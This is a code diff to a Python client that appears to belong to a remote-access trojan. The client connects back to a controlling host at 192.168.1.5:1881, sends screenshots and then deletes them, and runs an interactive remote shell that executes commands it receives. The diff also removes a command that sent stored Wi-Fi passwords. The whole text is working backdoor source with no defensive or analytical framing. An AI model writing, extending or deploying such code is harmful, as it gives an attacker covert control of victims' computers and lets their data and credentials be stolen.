@@ -8,7 +8,7 @@ import sys
 class Client(socket.socket):
     def __init__(self) -> None:
         super().__init__(socket.AF_INET,socket.SOCK_STREAM)
-        self.connect(("",1881))
+        self.connect(("192.168.1.5",1881))
         Thread(target=self.comminication()).start()
 
     def comminication(self):
@@ -33,20 +33,17 @@ class Client(socket.socket):
                     self.send(data_lenght.to_bytes(4,'big'))
                     self.send(data)
                 os.remove(f"{HiddenBladeComponent.test_konumu}ss.png")
-                
-            elif commands == "get-wifi-passw":
-                self.send(str(cc.wifiChecked()).encode())
             
             elif commands == "i-shell":
                 while True:
                     cmd = self.recv(1024).decode()
-                    if cmd:
+                    if cmd != "e--":
                         self.send(cc.terminalCommands(cmd).encode())
-                    if cmd == "exit":
+                    if cmd == "e--":
+                        cc.terminalCommands(cmd)
+                        self.send(b"exited")
                         break
-            elif commands == "exit":
-                self.send(b"Im sleeping")
-                sys.exit(0)
+
 def main():
     try:
         Client()
